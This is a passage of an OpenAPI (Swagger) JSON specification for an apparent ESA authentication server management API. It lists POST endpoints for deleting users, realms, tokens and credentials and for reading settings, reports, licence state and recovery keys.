        "responses": {
          "default": {
            "schema": {
              "type": "string"
            }
          }
        }
      }
    },
    "/manage/v2/DeleteComponentApiCredentials": {
      "post": {
        "tags": [
          "ESA"
        ],
        "summary": "Deletes API credentials for invited computer.",
        "operationId": "Manage.DeleteComponentApiCredentials",
        "consumes": [
          "application/json"
        ],
        "produces": [
          "application/json"
        ],
        "parameters": [
          {
            "name": "request object",
            "in": "body",
            "required": true,
            "schema": {
              "$ref": "#/definitions/Request_DeleteComponentApiCredentials"
            }
          }
        ],
        "responses": {
          "default": {}
        }
      }
    },
    "/manage/v2/DeleteComponentApiCredentials_Multiaction2": {
      "post": {
        "tags": [
          "ESA"
        ],
        "summary": "Deletes API credentials for invited computer.",
        "operationId": "Manage.DeleteComponentApiCredentials_Multiaction2",
        "consumes": [
          "application/json"
        ],
        "produces": [
          "application/json"
        ],
        "parameters": [
          {
            "name": "request object",
            "in": "body",
            "required": true,
            "schema": {
              "$ref": "#/definitions/Request_DeleteComponentApiCredentials_Multiaction2"
            }
          }
        ],
        "responses": {
          "default": {
            "schema": {
              "type": "string"
            }
          }
        }
      }
    },
    "/manage/v2/DeleteEmptyRealms": {
      "post": {
        "tags": [
          "ESA"
        ],
        "summary": "Automatically deletes all empty realms.",
        "description": "Note that a realm can still be automatically created during user authentication.",
        "operationId": "Manage.DeleteEmptyRealms",
        "consumes": [
          "application/json"
        ],
        "produces": [
          "application/json"
        ],
        "parameters": [
          {
            "name": "request object",
            "in": "body",
            "required": true,
            "schema": {
              "$ref": "#/definitions/Request_DeleteEmptyRealms"
            }
          }
        ],
        "responses": {
          "default": {
            "schema": {
              "type": "integer",
              "format": "int32"
            }
          }
        }
      }
    },
    "/manage/v2/DeleteHardToken": {
      "post": {
        "tags": [
          "ESA"
        ],
        "summary": "Deletes hard token.",
        "operationId": "Manage.DeleteHardToken",
        "consumes": [
          "application/json"
        ],
        "produces": [
          "application/json"
        ],
        "parameters": [
          {
            "name": "request object",
            "in": "body",
            "required": true,
            "schema": {
              "$ref": "#/definitions/Request_DeleteHardToken"
            }
          }
        ],
        "responses": {
          "default": {}
        }
      }
    },
    "/manage/v2/DeleteHardTokens_Multiaction2": {
      "post": {
        "tags": [
          "ESA"
        ],
        "summary": "Deletes hard tokens.",
        "operationId": "Manage.DeleteHardTokens_Multiaction2",
        "consumes": [
          "application/json"
        ],
        "produces": [
          "application/json"
        ],
        "parameters": [
          {
            "name": "request object",
            "in": "body",
            "required": true,
            "schema": {
              "$ref": "#/definitions/Request_DeleteHardTokens_Multiaction2"
            }
          }
        ],
        "responses": {
          "default": {
            "schema": {
              "type": "string"
            }
          }
        }
      }
    },
    "/manage/v2/DeleteIdentityProviderConfiguration": {
      "post": {
        "tags": [
          "ESA"
        ],
        "summary": "Deletes Identity Provider configuration.",
        "operationId": "Manage.DeleteIdentityProviderConfiguration",
        "consumes": [
          "application/json"
        ],
        "produces": [
          "application/json"
        ],
        "parameters": [
          {
            "name": "request object",
            "in": "body",
            "required": true,
            "schema": {
              "$ref": "#/definitions/Request_DeleteIdentityProviderConfiguration"
            }
          }
        ],
        "responses": {
          "default": {}
        }
      }
    },
    "/manage/v2/DeleteInvitation": {
      "post": {
        "tags": [
          "ESA"
        ],
        "summary": "Delete canceled and not used invitation.",
        "operationId": "Manage.DeleteInvitation",
        "consumes": [
          "application/json"
        ],
        "produces": [
          "application/json"
        ],
        "parameters": [
          {
            "name": "request object",
            "in": "body",
            "required": true,
            "schema": {
              "$ref": "#/definitions/Request_DeleteInvitation"
            }
          }
        ],
        "responses": {
          "default": {}
        }
      }
    },
    "/manage/v2/DeleteInvitations_Multiaction2": {
      "post": {
        "tags": [
          "ESA"
        ],
        "summary": "Delete canceled and not used invitations.",
        "operationId": "Manage.DeleteInvitations_Multiaction2",
        "consumes": [
          "application/json"
        ],
        "produces": [
          "application/json"
        ],
        "parameters": [
          {
            "name": "request object",
            "in": "body",
            "required": true,
            "schema": {
              "$ref": "#/definitions/Request_DeleteInvitations_Multiaction2"
            }
          }
        ],
        "responses": {
          "default": {
            "schema": {
              "type": "string"
            }
          }
        }
      }
    },
    "/manage/v2/DeleteRadiusClient": {
      "post": {
        "tags": [
          "ESA"
        ],
        "summary": "Deletes RADIUS client definition.",
        "operationId": "Manage.DeleteRadiusClient",
        "consumes": [
          "application/json"
        ],
        "produces": [
          "application/json"
        ],
        "parameters": [
          {
            "name": "request object",
            "in": "body",
            "required": true,
            "schema": {
              "$ref": "#/definitions/Request_DeleteRadiusClient"
            }
          }
        ],
        "responses": {
          "default": {}
        }
      }
    },
    "/manage/v2/DeleteRealm": {
      "post": {
        "tags": [
          "ESA"
        ],
        "summary": "Deletes a realm.",
        "description": "Note that a realm can still be automatically created during user authentication.<br /><br /><b>Parameters of request (see Model for additional descriptions):</b>\n<b>realm</b>: Realm parameters.",
        "operationId": "Manage.DeleteRealm",
        "consumes": [
          "application/json"
        ],
        "produces": [
          "application/json"
        ],
        "parameters": [
          {
            "name": "request object",
            "in": "body",
            "required": true,
            "schema": {
              "$ref": "#/definitions/Request_DeleteRealm"
            }
          }
        ],
        "responses": {
          "default": {}
        }
      }
    },
    "/manage/v2/DeleteUser": {
      "post": {
        "tags": [
          "ESA"
        ],
        "summary": "Deletes the specified user.",
        "description": "Users can be deleted only in realms owned by ESA (in AD mode, the default domain realm is not owned by ESA).<br /><br /><b>Parameters of request (see Model for additional descriptions):</b>\n<b>realm</b>: User's realm. In AD mode, send null to authentication methods to use the default domain.",
        "operationId": "Manage.DeleteUser",
        "consumes": [
          "application/json"
        ],
        "produces": [
          "application/json"
        ],
        "parameters": [
          {
            "name": "request object",
            "in": "body",
            "required": true,
            "schema": {
              "$ref": "#/definitions/Request_DeleteUser"
            }
          }
        ],
        "responses": {
          "default": {}
        }
      }
    },
    "/manage/v2/DeleteUsers_Multiaction2": {
      "post": {
        "tags": [
          "ESA"
        ],
        "summary": "Deletes the specified users.",
        "description": "Users can be deleted only in realms owned by ESA (in AD mode, the default domain realm is not owned by ESA).<br /><br /><b>Parameters of request (see Model for additional descriptions):</b>\n<b>usersWithRealm/Realm</b>: Realm the user belongs to.\n<b>filter/Realm</b>: Filtering by realm",
        "operationId": "Manage.DeleteUsers_Multiaction2",
        "consumes": [
          "application/json"
        ],
        "produces": [
          "application/json"
        ],
        "parameters": [
          {
            "name": "request object",
            "in": "body",
            "required": true,
            "schema": {
              "$ref": "#/definitions/Request_DeleteUsers_Multiaction2"
            }
          }
        ],
        "responses": {
          "default": {
            "schema": {
              "type": "string"
            }
          }
        }
      }
    },
    "/manage/v2/Deprovision": {
      "post": {
        "tags": [
          "ESA"
        ],
        "summary": "Deprovisions the user.",
        "description": "Disables all authentication types and removes all authentication data (including secrets) for the user. Does not revoke hard token.<br /><br /><b>Parameters of request (see Model for additional descriptions):</b>\n<b>realm</b>: User's realm. In AD mode, send null to authentication methods to use the default domain.",
        "operationId": "Manage.Deprovision",
        "consumes": [
          "application/json"
        ],
        "produces": [
          "application/json"
        ],
        "parameters": [
          {
            "name": "request object",
            "in": "body",
            "required": true,
            "schema": {
              "$ref": "#/definitions/Request_Deprovision"
            }
          }
        ],
        "responses": {
          "default": {}
        }
      }
    },
    "/manage/v2/Deprovision_Multiaction2": {
      "post": {
        "tags": [
          "ESA"
        ],
        "summary": "Deprovisions users.",
        "description": "Disables all authentication types and removes all authentication data (including secrets) for the users. Does not revoke hard token.<br /><br /><b>Parameters of request (see Model for additional descriptions):</b>\n<b>usersWithRealm/Realm</b>: Realm the user belongs to.\n<b>filter/Realm</b>: Filtering by realm",
        "operationId": "Manage.Deprovision_Multiaction2",
        "consumes": [
          "application/json"
        ],
        "produces": [
          "application/json"
        ],
        "parameters": [
          {
            "name": "request object",
            "in": "body",
            "required": true,
            "schema": {
              "$ref": "#/definitions/Request_Deprovision_Multiaction2"
            }
          }
        ],
        "responses": {
          "default": {
            "schema": {
              "type": "string"
            }
          }
        }
      }
    },
    "/manage/v2/GenerateEventReportExport": {
      "post": {
        "tags": [
          "ESA"
        ],
        "summary": "Export report.",
        "description": "Get events report response based on the specified filter exported in specified file format. Use DownloadExportedReport to download generated file.",
        "operationId": "Manage.GenerateEventReportExport",
        "consumes": [
          "application/json"
        ],
        "produces": [
          "application/json"
        ],
        "parameters": [
          {
            "name": "request object",
            "in": "body",
            "required": true,
            "schema": {
              "$ref": "#/definitions/Request_GenerateEventReportExport"
            }
          }
        ],
        "responses": {
          "default": {
            "schema": {
              "type": "string"
            }
          }
        }
      }
    },
    "/manage/v2/GetAllNotificationTypes": {
      "post": {
        "tags": [
          "ESA"
        ],
        "summary": "Gets all notification types.",
        "description": "Gets all possible notification types.",
        "operationId": "Manage.GetAllNotificationTypes",
        "consumes": [
          "application/json"
        ],
        "produces": [
          "application/json"
        ],
        "parameters": [
          {
            "name": "request object",
            "in": "body",
            "required": true,
            "schema": {
              "$ref": "#/definitions/Request_GetAllNotificationTypes"
            }
          }
        ],
        "responses": {
          "default": {
            "schema": {
              "type": "array",
              "items": {
                "type": "string"
              }
            }
          }
        }
      }
    },
    "/manage/v2/GetAllOrigins": {
      "post": {
        "tags": [
          "ESA"
        ],
        "summary": "Get origins for all components.",
        "operationId": "Manage.GetAllOrigins",
        "consumes": [
          "application/json"
        ],
        "produces": [
          "application/json"
        ],
        "parameters": [
          {
            "name": "request object",
            "in": "body",
            "required": true,
            "schema": {
              "$ref": "#/definitions/Request_GetAllOrigins"
            }
          }
        ],
        "responses": {
          "default": {
            "schema": {
              "type": "array",
              "items": {
                "type": "string"
              }
            }
          }
        }
      }
    },
    "/manage/v2/GetAllOriginsWithInfo": {
      "post": {
        "tags": [
          "ESA"
        ],
        "summary": "Get origins for all components.",
        "operationId": "Manage.GetAllOriginsWithInfo",
        "consumes": [
          "application/json"
        ],
        "produces": [
          "application/json"
        ],
        "parameters": [
          {
            "name": "request object",
            "in": "body",
            "required": true,
            "schema": {
              "$ref": "#/definitions/Request_GetAllOriginsWithInfo"
            }
          }
        ],
        "responses": {
          "default": {
            "schema": {
              "type": "array",
              "items": {
                "$ref": "#/definitions/OriginInfo"
              }
            }
          }
        }
      }
    },
    "/manage/v2/GetApiCredentials2": {
      "post": {
        "tags": [
          "ESA"
        ],
        "summary": "Gets filtered and sorted API credentials.",
        "description": "This includes only manually created API credentials. It does not include API credentials for invited computers.<br /><br /><b>Parameters of request (see Model for additional descriptions):</b>\n<b>filter</b>: If specified, items will be filtered, sorted and divided by specified properties.",
        "operationId": "Manage.GetApiCredentials2",
        "consumes": [
          "application/json"
        ],
        "produces": [
          "application/json"
        ],
        "parameters": [
          {
            "name": "request object",
            "in": "body",
            "required": true,
            "schema": {
              "$ref": "#/definitions/Request_GetApiCredentials2"
            }
          }
        ],
        "responses": {
          "default": {
            "schema": {
              "$ref": "#/definitions/ApiConsumerSettingsResponse"
            }
          }
        }
      }
    },
    "/manage/v2/GetApiCredentialsByUsername": {
      "post": {
        "tags": [
          "ESA"
        ],
        "summary": "Gets API credentials by user name.",
        "operationId": "Manage.GetApiCredentialsByUsername",
        "consumes": [
          "application/json"
        ],
        "produces": [
          "application/json"
        ],
        "parameters": [
          {
            "name": "request object",
            "in": "body",
            "required": true,
            "schema": {
              "$ref": "#/definitions/Request_GetApiCredentialsByUsername"
            }
          }
        ],
        "responses": {
          "default": {
            "schema": {
              "$ref": "#/definitions/ApiConsumerSettingsPublic"
            }
          }
        }
      }
    },
    "/manage/v2/GetComponentApiCredentials2": {
      "post": {
        "tags": [
          "ESA"
        ],
        "summary": "Gets list of filtered and sorted component API credentials.",
        "description": "This includes only API credentials created for invited computers.<br /><br /><b>Parameters of request (see Model for additional descriptions):</b>\n<b>filter</b>: If specified, items will be filtered, sorted and divided by specified properties.",
        "operationId": "Manage.GetComponentApiCredentials2",
        "consumes": [
          "application/json"
        ],
        "produces": [
          "application/json"
        ],
        "parameters": [
          {
            "name": "request object",
            "in": "body",
            "required": true,
            "schema": {
              "$ref": "#/definitions/Request_GetComponentApiCredentials2"
            }
          }
        ],
        "responses": {
          "default": {
            "schema": {
              "$ref": "#/definitions/ApiConsumerSettingsResponse"
            }
          }
        }
      }
    },
    "/manage/v2/GetComponentApiCredentialsByUsername": {
      "post": {
        "tags": [
          "ESA"
        ],
        "summary": "Gets component API credentials by user name.",
        "operationId": "Manage.GetComponentApiCredentialsByUsername",
        "consumes": [
          "application/json"
        ],
        "produces": [
          "application/json"
        ],
        "parameters": [
          {
            "name": "request object",
            "in": "body",
            "required": true,
            "schema": {
              "$ref": "#/definitions/Request_GetComponentApiCredentialsByUsername"
            }
          }
        ],
        "responses": {
          "default": {
            "schema": {
              "$ref": "#/definitions/ApiConsumerSettingsPublic"
            }
          }
        }
      }
    },
    "/manage/v2/GetComponentSettings2": {
      "post": {
        "tags": [
          "ESA"
        ],
        "summary": "Gets filtered and sorted settings for components.",
        "description": "Returns settings for all instances of components of the specified type.<br /><br /><b>Parameters of request (see Model for additional descriptions):</b>\n<b>filter</b>: If specified, items will be filtered, sorted and divided by specified properties.<br /><br /><b>Parameters of response (see Model for additional descriptions):</b>\n<b>FilteredItems/Info</b>: Information about the component instance.\n<b>FilteredItems/Settings</b>: Settings for the component instance.\n<b>FilteredItems/Statistics</b>: Statistics about the component instance.",
        "operationId": "Manage.GetComponentSettings2",
        "consumes": [
          "application/json"
        ],
        "produces": [
          "application/json"
        ],
        "parameters": [
          {
            "name": "request object",
            "in": "body",
            "required": true,
            "schema": {
              "$ref": "#/definitions/Request_GetComponentSettings2"
            }
          }
        ],
        "responses": {
          "default": {
            "schema": {
              "$ref": "#/definitions/ComponentInfoWithSettingsResponse"
            }
          }
        }
      }
    },
    "/manage/v2/GetComponentTypeSettings": {
      "post": {
        "tags": [
          "ESA"
        ],
        "summary": "Gets settings for a component type.",
        "description": "<br /><br /><b>Parameters of response (see Model for additional descriptions):</b>\n<b>Info</b>: Information about the component type. Cannot be changed.\n<b>Settings</b>: Settings for the component type.\n<b>Settings/LocalLoginSettings</b>: Contains settings for local logins, if it is a local logins component type.",
        "operationId": "Manage.GetComponentTypeSettings",
        "consumes": [
          "application/json"
        ],
        "produces": [
          "application/json"
        ],
        "parameters": [
          {
            "name": "request object",
            "in": "body",
            "required": true,
            "schema": {
              "$ref": "#/definitions/Request_GetComponentTypeSettings"
            }
          }
        ],
        "responses": {
          "default": {
            "schema": {
              "type": "array",
              "items": {
                "$ref": "#/definitions/ComponentTypeInfoWithSettings"
              }
            }
          }
        }
      }
    },
    "/manage/v2/GetComponentTypeStatistics": {
      "post": {
        "tags": [
          "ESA"
        ],
        "summary": "Gets statistics for a component type.",
        "description": "<br /><br /><b>Parameters of response (see Model for additional descriptions):</b>\n<b>Info</b>: Information about the component type.\n<b>Statistics</b>: Current statistics for the component type.",
        "operationId": "Manage.GetComponentTypeStatistics",
        "consumes": [
          "application/json"
        ],
        "produces": [
          "application/json"
        ],
        "parameters": [
          {
            "name": "request object",
            "in": "body",
            "required": true,
            "schema": {
              "$ref": "#/definitions/Request_GetComponentTypeStatistics"
            }
          }
        ],
        "responses": {
          "default": {
            "schema": {
              "type": "array",
              "items": {
                "$ref": "#/definitions/ComponentTypeWithStatistics"
              }
            }
          }
        }
      }
    },
    "/manage/v2/GetCoreInfo": {
      "post": {
        "tags": [
          "ESA"
        ],
        "summary": "Gets general information about Authentication Server.",
        "description": "<br /><br /><b>Parameters of response (see Model for additional descriptions):</b>\n<b>UrlInfo_User</b>: URL to offer the user in various situations related to Users consumption.\n<b>UrlInfo_OTPSMS</b>: URL to offer the user in various situations related to OTP SMS consumption.",
        "operationId": "Manage.GetCoreInfo",
        "consumes": [
          "application/json"
        ],
        "produces": [
          "application/json"
        ],
        "parameters": [
          {
            "name": "request object",
            "in": "body",
            "required": true,
            "schema": {
              "$ref": "#/definitions/Request_GetCoreInfo"
            }
          }
        ],
        "responses": {
          "default": {
            "schema": {
              "$ref": "#/definitions/CoreInfo"
            }
          }
        }
      }
    },
    "/manage/v2/GetCoreServerInfo": {
      "post": {
        "tags": [
          "ESA"
        ],
        "summary": "Gets information about Authentication Server usable by components.",
        "operationId": "Manage.GetCoreServerInfo",
        "consumes": [
          "application/json"
        ],
        "produces": [
          "application/json"
        ],
        "parameters": [
          {
            "name": "request object",
            "in": "body",
            "required": true,
            "schema": {
              "$ref": "#/definitions/Request_GetCoreServerInfo"
            }
          }
        ],
        "responses": {
          "default": {
            "schema": {
              "$ref": "#/definitions/CoreServerInfo"
            }
          }
        }
      }
    },
    "/manage/v2/GetCoreSettings": {
      "post": {
        "tags": [
          "ESA"
        ],
        "summary": "Gets global settings.",
        "description": "Gets global settings of the Authentication Server.<br /><br /><b>Parameters of response (see Model for additional descriptions):</b>\n<b>Delivery</b>: Options for message delivery. If saving using SetCoreSettings and this member is specified, all its members have to be filled in correctly (the whole structure will be saved). Use GetCoreSettings to get current values.\n<b>DefaultUserConfig</b>: Default configuration for new users. If saving using SetCoreSettings and this member is specified, all its members have to be filled in correctly (the whole structure will be saved). Use GetCoreSettings to get current values.\n<b>DefaultUserConfig/AuthenticationTypes</b>: Enabled authentication types. If saving using SetCoreSettings and this member is specified, all its members have to be filled in correctly (the whole structure will be saved). Use GetCoreSettings to get current values.\n<b>Reports</b>: Reports settings.\n<b>Reports/ElasticSearch</b>: Elasticsearch setting to be used for reports.\n<b>FIDO</b>: FIDO settings.\n<b>Notifications</b>: Notifications settings.\n<b>EmailValidation</b>: Notifications email validation.\n<b>Smtp</b>: SMTP server configuration. Used for sending notifications. Only on-prem.\n<b>ManagementAccess</b>: Restriction to Authentication Server management. Only on-prem.",
        "operationId": "Manage.GetCoreSettings",
        "consumes": [
          "application/json"
        ],
        "produces": [
          "application/json"
        ],
        "parameters": [
          {
            "name": "request object",
            "in": "body",
            "required": true,
            "schema": {
              "$ref": "#/definitions/Request_GetCoreSettings"
            }
          }
        ],
        "responses": {
          "default": {
            "schema": {
              "$ref": "#/definitions/CoreSettings"
            }
          }
        }
      }
    },
    "/manage/v2/GetCoreSettingsForAvailableCompanies": {
      "post": {
        "tags": [
          "ESA"
        ],
        "summary": "Gets global settings for Companies.",
        "description": "Gets global settings of the Authentication Server for all available Companies.<br /><br /><b>Parameters of response (see Model for additional descriptions):</b>\n<b>Settings</b>: Global settings.\n<b>Settings/Delivery</b>: Options for message delivery. If saving using SetCoreSettings and this member is specified, all its members have to be filled in correctly (the whole structure will be saved). Use GetCoreSettings to get current values.\n<b>Settings/DefaultUserConfig</b>: Default configuration for new users. If saving using SetCoreSettings and this member is specified, all its members have to be filled in correctly (the whole structure will be saved). Use GetCoreSettings to get current values.\n<b>Settings/DefaultUserConfig/AuthenticationTypes</b>: Enabled authentication types. If saving using SetCoreSettings and this member is specified, all its members have to be filled in correctly (the whole structure will be saved). Use GetCoreSettings to get current values.\n<b>Settings/Reports</b>: Reports settings.\n<b>Settings/Reports/ElasticSearch</b>: Elasticsearch setting to be used for reports.\n<b>Settings/FIDO</b>: FIDO settings.\n<b>Settings/Notifications</b>: Notifications settings.\n<b>Settings/EmailValidation</b>: Notifications email validation.\n<b>Settings/Smtp</b>: SMTP server configuration. Used for sending notifications. Only on-prem.\n<b>Settings/ManagementAccess</b>: Restriction to Authentication Server management. Only on-prem.",
        "operationId": "Manage.GetCoreSettingsForAvailableCompanies",
        "consumes": [
          "application/json"
        ],
        "produces": [
          "application/json"
        ],
        "parameters": [
          {
            "name": "request object",
            "in": "body",
            "required": true,
            "schema": {
              "$ref": "#/definitions/Request_GetCoreSettingsForAvailableCompanies"
            }
          }
        ],
        "responses": {
          "default": {
            "schema": {
              "type": "array",
              "items": {
                "$ref": "#/definitions/CoreSettingsWithCompany"
              }
            }
          }
        }
      }
    },
    "/manage/v2/GetEventReport": {
      "post": {
        "tags": [
          "ESA"
        ],
        "summary": "Gets events report.",
        "description": "Get events report response based on the specified filter.<br /><br /><b>Parameters of response (see Model for additional descriptions):</b>\n<b>ReportEvents/Type</b>: Event type details.",
        "operationId": "Manage.GetEventReport",
        "consumes": [
          "application/json"
        ],
        "produces": [
          "application/json"
        ],
        "parameters": [
          {
            "name": "request object",
            "in": "body",
            "required": true,
            "schema": {
              "$ref": "#/definitions/Request_GetEventReport"
            }
          }
        ],
        "responses": {
          "default": {
            "schema": {
              "$ref": "#/definitions/ReportEventUiDataResponse"
            }
          }
        }
      }
    },
    "/manage/v2/GetEventReportGraph": {
      "post": {
        "tags": [
          "ESA"
        ],
        "summary": "Gets events report.",
        "description": "Get events report graph based on the specified filter.",
        "operationId": "Manage.GetEventReportGraph",
        "consumes": [
          "application/json"
        ],
        "produces": [
          "application/json"
        ],
        "parameters": [
          {
            "name": "request object",
            "in": "body",
            "required": true,
            "schema": {
              "$ref": "#/definitions/Request_GetEventReportGraph"
            }
          }
        ],
        "responses": {
          "default": {
            "schema": {
              "$ref": "#/definitions/ReportGraphDataResponse"
            }
          }
        }
      }
    },
    "/manage/v2/GetGroups": {
      "post": {
        "tags": [
          "ESA"
        ],
        "summary": "Gets user groups.",
        "description": "Gets groups from which AllowedVpnGroup (UpdateRadiusClient) can be selected.",
        "operationId": "Manage.GetGroups",
        "consumes": [
          "application/json"
        ],
        "produces": [
          "application/json"
        ],
        "parameters": [
          {
            "name": "request object",
            "in": "body",
            "required": true,
            "schema": {
              "$ref": "#/definitions/Request_GetGroups"
            }
          }
        ],
        "responses": {
          "default": {
            "schema": {
              "type": "array",
              "items": {
                "$ref": "#/definitions/Group"
              }
            }
          }
        }
      }
    },
    "/manage/v2/GetHardTokens2": {
      "post": {
        "tags": [
          "ESA"
        ],
        "summary": "Gets filtered and sorted hard tokens.",
        "description": "Gets filtered and sorted hard tokens which were imported (both currently assigned and unassigned).<br /><br /><b>Parameters of request (see Model for additional descriptions):</b>\n<b>filter</b>: If specified, items will be filtered, sorted and divided by specified properties.<br /><br /><b>Parameters of response (see Model for additional descriptions):</b>\n<b>FilteredItems/AssignedUser_Realm</b>: If assigned, contains realm of the current owner.",
        "operationId": "Manage.GetHardTokens2",
        "consumes": [
          "application/json"
        ],
        "produces": [
          "application/json"
        ],
        "parameters": [
          {
            "name": "request object",
            "in": "body",
            "required": true,
            "schema": {
              "$ref": "#/definitions/Request_GetHardTokens2"
            }
          }
        ],
        "responses": {
          "default": {
            "schema": {
              "$ref": "#/definitions/HardTokensResponse"
            }
          }
        }
      }
    },
    "/manage/v2/GetIdentityProviderConfigurationById": {
      "post": {
        "tags": [
          "ESA"
        ],
        "summary": "Gets single Identity Provider configuration definition.",
        "description": "<br /><br /><b>Parameters of response (see Model for additional descriptions):</b>\n<b>OriginalIdentityProvider</b>: Configuration of original Identity Provider which will be contacted by ESA Identity Provider to obtain user identity.",
        "operationId": "Manage.GetIdentityProviderConfigurationById",
        "consumes": [
          "application/json"
        ],
        "produces": [
          "application/json"
        ],
        "parameters": [
          {
            "name": "request object",
            "in": "body",
            "required": true,
            "schema": {
              "$ref": "#/definitions/Request_GetIdentityProviderConfigurationById"
            }
          }
        ],
        "responses": {
          "default": {
            "schema": {
              "$ref": "#/definitions/IdentityProviderConfiguration"
            }
          }
        }
      }
    },
    "/manage/v2/GetIdentityProviderConfigurations2": {
      "post": {
        "tags": [
          "ESA"
        ],
        "summary": "Gets filtered and sorted Identity Provider configurations.",
        "description": "Gets defined Identity Provider configurations for the specified Identity Provider server component.<br /><br /><b>Parameters of request (see Model for additional descriptions):</b>\n<b>filter</b>: If specified, items will be filtered, sorted and divided by specified properties.<br /><br /><b>Parameters of response (see Model for additional descriptions):</b>\n<b>FilteredItems/OriginalIdentityProvider</b>: Configuration of original Identity Provider which will be contacted by ESA Identity Provider to obtain user identity.",
        "operationId": "Manage.GetIdentityProviderConfigurations2",
        "consumes": [
          "application/json"
        ],
        "produces": [
          "application/json"
        ],
        "parameters": [
          {
            "name": "request object",
            "in": "body",
            "required": true,
            "schema": {
              "$ref": "#/definitions/Request_GetIdentityProviderConfigurations2"
            }
          }
        ],
        "responses": {
          "default": {
            "schema": {
              "$ref": "#/definitions/IdentityProviderConfigurationsResponse"
            }
          }
        }
      }
    },
    "/manage/v2/GetInvitationByCode": {
      "post": {
        "tags": [
          "ESA"
        ],
        "summary": "Gets invitation by code.",
        "description": "Returns invitation",
        "operationId": "Manage.GetInvitationByCode",
        "consumes": [
          "application/json"
        ],
        "produces": [
          "application/json"
        ],
        "parameters": [
          {
            "name": "request object",
            "in": "body",
            "required": true,
            "schema": {
              "$ref": "#/definitions/Request_GetInvitationByCode"
            }
          }
        ],
        "responses": {
          "default": {
            "schema": {
              "$ref": "#/definitions/Invitation"
            }
          }
        }
      }
    },
    "/manage/v2/GetInvitations2": {
      "post": {
        "tags": [
          "ESA"
        ],
        "summary": "Gets filtered and sorted invitations.",
        "description": "Returns filtered and sorted invitations including invalid (e.g. expired) ones.<br /><br /><b>Parameters of request (see Model for additional descriptions):</b>\n<b>filter</b>: If specified, items will be filtered, sorted and divided by specified properties.",
        "operationId": "Manage.GetInvitations2",
        "consumes": [
          "application/json"
        ],
        "produces": [
          "application/json"
        ],
        "parameters": [
          {
            "name": "request object",
            "in": "body",
            "required": true,
            "schema": {
              "$ref": "#/definitions/Request_GetInvitations2"
            }
          }
        ],
        "responses": {
          "default": {
            "schema": {
              "$ref": "#/definitions/InvitationsResponse"
            }
          }
        }
      }
    },
    "/manage/v2/GetLicenseStateDetail3": {
      "post": {
        "tags": [
          "ESA"
        ],
        "summary": "Gets state of license.",
        "description": "<br /><br /><b>Parameters of response (see Model for additional descriptions):</b>\n<b>LicenseStates/Users</b>: The current state of users usage.\n<b>LicenseStates/AllUsers</b>: The current state of all users (2FA users + Non2FA users) usage.\n<b>LicenseStates/Components</b>: The current state of components usage.\n<b>LicenseStates/OtpSmsCredits</b>: The current state of OTP SMS credits usage.\n<b>LicenseStates/ExpiryDate</b>: The current state of license expiration.\n<b>LicenseStates/LicenseInfo</b>: Information about the current license(s).\n<b>LicenseStates/LicenseInfo/ProductInstance_Primary</b>: Information about primary license(s).\n<b>LicenseStates/LicenseInfo/ProductInstance_Primary/Resource</b>: License(s) consumption information.\n<b>LicenseStates/LicenseInfo/ProductInstance_Primary/UrlInfo</b>: License related URLs to display to user in various situations.\n<b>LicenseStates/LicenseInfo/ProductInstance_Primary/DisplayInfo</b>: Various license information to display to user.\n<b>LicenseStates/LicenseInfo/ProductInstance_Secondary</b>: Information about secondary license(s).\n<b>LicenseStates/LicenseInfo/ProductInstance_Secondary/Resource</b>: License(s) consumption information.\n<b>LicenseStates/LicenseInfo/ProductInstance_Secondary/UrlInfo</b>: License related URLs to display to user in various situations.\n<b>LicenseStates/LicenseInfo/ProductInstance_Secondary/DisplayInfo</b>: Various license information to display to user.",
        "operationId": "Manage.GetLicenseStateDetail3",
        "consumes": [
          "application/json"
        ],
        "produces": [
          "application/json"
        ],
        "parameters": [
          {
            "name": "request object",
            "in": "body",
            "required": true,
            "schema": {
              "$ref": "#/definitions/Request_GetLicenseStateDetail3"
            }
          }
        ],
        "responses": {
          "default": {
            "schema": {
              "$ref": "#/definitions/LicenseStateForCompanies"
            }
          }
        }
      }
    },
    "/manage/v2/GetLiveInstallerLink": {
      "post": {
        "tags": [
          "ESA"
        ],
        "summary": "Get live installer link",
        "description": "Use to generate live installer link.<br /><br /><b>Parameters of request (see Model for additional descriptions):</b>\n<b>parameters</b>: Installation parameters",
        "operationId": "Manage.GetLiveInstallerLink",
        "consumes": [
          "application/json"
        ],
        "produces": [
          "application/json"
        ],
        "parameters": [
          {
            "name": "request object",
            "in": "body",
            "required": true,
            "schema": {
              "$ref": "#/definitions/Request_GetLiveInstallerLink"
            }
          }
        ],
        "responses": {
          "default": {
            "schema": {
              "type": "string"
            }
          }
        }
      }
    },
    "/manage/v2/GetMasterRecoveryKeyAndInvalidateAfterLogin": {
      "post": {
        "tags": [
          "ESA"
        ],
        "summary": "Gets master recovery key for the user.",
        "description": "If the user has 2FA enabled, the master recovery key can be used once to log in instead of any other authentication type. The MRK will be usable only from one component instance - specified by componentKey and componentType.<br /><br /><b>Parameters of request (see Model for additional descriptions):</b>\n<b>realm</b>: User's realm. In AD mode, send null to authentication methods to use the default domain.",
        "operationId": "Manage.GetMasterRecoveryKeyAndInvalidateAfterLogin",
        "consumes": [
          "application/json"
        ],
        "produces": [
          "application/json"
        ],
        "parameters": [
          {
            "name": "request object",
            "in": "body",
            "required": true,
            "schema": {
              "$ref": "#/definitions/Request_GetMasterRecoveryKeyAndInvalidateAfterLogin"
            }
          }
        ],
        "responses": {
          "default": {
            "schema": {
              "$ref": "#/definitions/Mrk"
            }
          }
        }
      }
    },
    "/manage/v2/GetMultiActionProgress": {
      "post": {
        "tags": [
          "ESA"
        ],
        "summary": "Get progress of selected multi action.",
        "description": "Returns information about selected multi action.",
        "operationId": "Manage.GetMultiActionProgress",
        "consumes": [
          "application/json"
        ],
        "produces": [
          "application/json"
        ],
        "parameters": [
          {
            "name": "request object",
            "in": "body",
            "required": true,
            "schema": {
              "$ref": "#/definitions/Request_GetMultiActionProgress"
            }
          }
        ],
        "responses": {
          "default": {
            "schema": {
              "$ref": "#/definitions/MultiActionProgress"
            }
          }
        }
      }
    },
    "/manage/v2/GetProductVersionState": {
      "post": {
        "tags": [
          "ESA"
        ],
        "summary": "Gets state of Authentication Servers version.",
        "description": "Obtains information about the latest version and if the current Authentication Servers are up to date. Considers the highest version of all the installed and reachable servers (according to DNS records).",
        "operationId": "Manage.GetProductVersionState",
        "consumes": [
          "application/json"
        ],
        "produces": [
          "application/json"
        ],
        "parameters": [
          {
            "name": "request object",
            "in": "body",
            "required": true,
            "schema": {
              "$ref": "#/definitions/Request_GetProductVersionState"
            }
          }
        ],
        "responses": {
          "default": {
            "schema": {
              "$ref": "#/definitions/ProductVersionState"
            }
